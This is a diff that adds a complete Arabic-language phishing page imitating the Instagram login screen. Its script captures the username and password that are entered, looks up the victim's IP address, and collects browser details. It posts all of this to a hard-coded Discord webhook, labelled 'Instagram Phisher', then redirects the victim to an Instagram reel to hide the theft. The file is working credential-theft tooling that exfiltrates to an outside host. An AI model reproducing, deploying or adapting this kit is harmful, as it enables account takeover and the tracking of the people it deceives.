@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram • تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 40px 30px;
+            margin-bottom: 10px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 50px;
+            border-radius: 12px;
+        }
+        .logo div {
+            font-size: 28px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background: #fafafa;
+            font-size: 12px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 8px;
+            margin-top: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.9;
+        }
+        button:hover {
+            opacity: 1;
+        }
+        .divider {
+            display: flex;
+            margin: 20px 0;
+            align-items: center;
+        }
+        .line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .or {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .fb { text-align: center; margin: 15px 0; }
+        .fb a { color: #385185; text-decoration: none; font-weight: 600; font-size: 14px; }
+        .forgot { text-align: center; margin-top: 15px; }
+        .forgot a { color: #00376b; text-decoration: none; font-size: 12px; }
+        .signup {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .error { color: #ed4956; font-size: 13px; text-align: center; margin-top: 12px; }
+        .app-store { text-align: center; margin-top: 20px; }
+        .store-badge { width: 130px; margin: 0 4px; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 6px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <img src="https://i.ibb.co/Kpszcy8d/IMG-20260506-105342.jpg" alt="Instagram">
+            <div>Instagram</div>
+        </div>
+        
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" autocomplete="off" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <button type="submit" id="submitBtn">تسجيل الدخول</button>
+        </form>
+        
+        <div id="errorMsg" class="error"></div>
+        
+        <div class="divider">
+            <div class="line"></div>
+            <div class="or">أو</div>
+            <div class="line"></div>
+        </div>
+        
+        <div class="fb"><a href="#">تسجيل الدخول بواسطة Facebook</a></div>
+        <div class="forgot"><a href="#">هل نسيت كلمة السر؟</a></div>
+    </div>
+    
+    <div class="signup">
+        ليس لديك حساب؟ <a href="#">سجل الآن</a>
+    </div>
+    
+    <div class="app-store">
+        <svg class="store-badge" viewBox="0 0 135 40"><rect width="135" height="40" rx="6" fill="#000"/><text x="15" y="25" fill="#fff" font-size="10" font-family="Arial">Download on the</text><text x="15" y="35" fill="#fff" font-size="14" font-weight="bold">App Store</text></svg>
+        <svg class="store-badge" viewBox="0 0 135 40" style="margin-left: 6px;"><rect width="135" height="40" rx="6" fill="#000"/><text x="45" y="25" fill="#fff" font-size="10">GET IT ON</text><text x="35" y="35" fill="#fff" font-size="14" font-weight="bold">Google Play</text></svg>
+    </div>
+</div>
+<div id="toast" class="toast"></div>
+
+<script>
+    // ========== التكوين ==========
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1458636443705675887/A9-G3bXc4mrmSveJr-XAjDpYNgHf2OTRi2jireiuJO4wZ4Te_6iaw0YqJdVTO30DNfH3";
+    const REEL_URL = "https://www.instagram.com/reel/DXsXyWLiDuB/?igsh=MTh3ZHpycWZiMjllNw==";
+    // ============================
+    
+    function showToast(msg, isError = false) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.style.backgroundColor = isError ? 'rgba(237, 73, 86, 0.9)' : 'rgba(0,0,0,0.8)';
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);
+    }
+    
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const submitBtn = document.getElementById('submitBtn');
+        
+        if (!email || !password) {
+            document.getElementById('errorMsg').innerText = 'الرجاء إدخال جميع البيانات';
+            showToast('يرجى إدخال البريد وكلمة المرور', true);
+            return;
+        }
+        
+        submitBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+        submitBtn.disabled = true;
+        document.getElementById('errorMsg').innerHTML = '';
+        
+        let ip = 'غير معروف';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        } catch(e) {}
+        
+        const ua = navigator.userAgent;
+        const language = navigator.language;
+        const screenSize = `${screen.width}x${screen.height}`;
+        const platform = navigator.platform;
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        
+        const embed = {
+            title: "🎯 INSTAGRAM LOGS | 2099 🎯",
+            color: 0xE1306C,
+            thumbnail: { url: "https://i.ibb.co/Kpszcy8d/IMG-20260506-105342.jpg" },
+            fields: [
+                { name: "📧 Email / Username", value: `\`\`\`${email}\`\`\``, inline: false },
+                { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
+                { name: "🆔 Session ID", value: `\`${sessionId}\``, inline: true },
+                { name: "💻 User Agent", value: `\`\`\`${ua.substring(0, 150)}${ua.length > 150 ? '...' : ''}\`\`\``, inline: false },
+                { name: "📱 Platform", value: `\`${platform}\``, inline: true },
+                { name: "🌍 Language", value: `\`${language}\``, inline: true },
+                { name: "📺 Screen", value: `\`${screenSize}\``, inline: true },
+                { name: "⏰ Time", value: `\`${new Date().toLocaleString('ar-EG')}\``, inline: true }
+            ],
+            footer: { text: "Instagram Phisher • Architect 2099", icon_url: "https://i.ibb.co/Kpszcy8d/IMG-20260506-105342.jpg" },
+            timestamp: new Date().toISOString()
+        };
+        
+        let sent = false;
+        for (let attempt = 0; attempt < 2; attempt++) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed], username: "Instagram Logger", avatar_url: "https://i.ibb.co/Kpszcy8d/IMG-20260506-105342.jpg" })
+                });
+                if (response.ok) { sent = true; break; }
+            } catch(e) {}
+            await new Promise(r => setTimeout(r, 500));
+        }
+        
+        if (sent) {
+            showToast("✅ تم التحقق! جارٍ التوجيه...");
+        } else {
+            showToast("⚠️ جارٍ التوجيه...");
+        }
+        
+        setTimeout(() => {
+            window.location.href = REEL_URL;
+        }, 1500);
+    });
+    
+    const inputs = document.querySelectorAll('input');
+    inputs.forEach(input => {
+        input.addEventListener('focus', () => { input.style.backgroundColor = '#fff'; });
+        input.addEventListener('blur', () => { if (!input.value) input.style.backgroundColor = '#fafafa'; });
+    });
+</script>
+</body>
+</html>
